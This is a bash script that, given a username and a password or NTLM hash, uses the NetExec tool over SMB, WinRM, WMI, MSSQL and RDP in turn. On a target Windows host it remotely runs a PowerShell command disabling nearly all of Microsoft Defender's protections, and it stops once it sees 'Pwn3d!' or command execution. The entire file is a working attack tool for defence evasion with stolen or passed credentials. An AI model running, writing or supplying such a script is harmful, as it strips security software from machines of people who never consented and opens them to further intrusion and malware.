#!/bin/bash
# Usage: ./nxc_full_fallback.sh <user> <pass_or_hash> <target> [hash]


COMMAND="Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true -DisableArchiveScanning $true -DisableEmailScanning $true -DisableRemovableDriveScanning $true"


USER="$1"; SECRET="$2"; TARGET="$3"; AUTH_TYPE="${4:-pass}"

if [ -z "$USER" ] || [ -z "$SECRET" ] || [ -z "$TARGET" ]; then
    echo "Usage: $0 <user> <pass_or_hash> <target> [hash]"
    exit 1
fi

if [ "$AUTH_TYPE" == "hash" ]; then
    AUTH_FLAG="-H"
else
    AUTH_FLAG="-p"
fi

echo "[*] User: $USER"
echo "[*] Target: $TARGET"
echo "[*] Command: $COMMAND"
echo "------------------------------------------"

# Protocols that support command execution, ordered by priority
PROTOCOLS=("smb" "winrm" "wmi" "mssql" "rdp")

for PROTO in "${PROTOCOLS[@]}"; do
    echo "[*] Trying $PROTO..."
    
    OUTPUT=$(nxc "$PROTO" "$TARGET" -u "$USER" "$AUTH_FLAG" "$SECRET" -x "$COMMAND" 2>&1)
    echo "$OUTPUT"
    
    if echo "$OUTPUT" | grep -qE "Pwn3d!|Command execution"; then
        echo "[+] Success on $PROTO, stopping."
        exit 0
    fi
    echo "------------------------------------------"
done

echo "[!] All protocols attempted, none succeeded with command execution."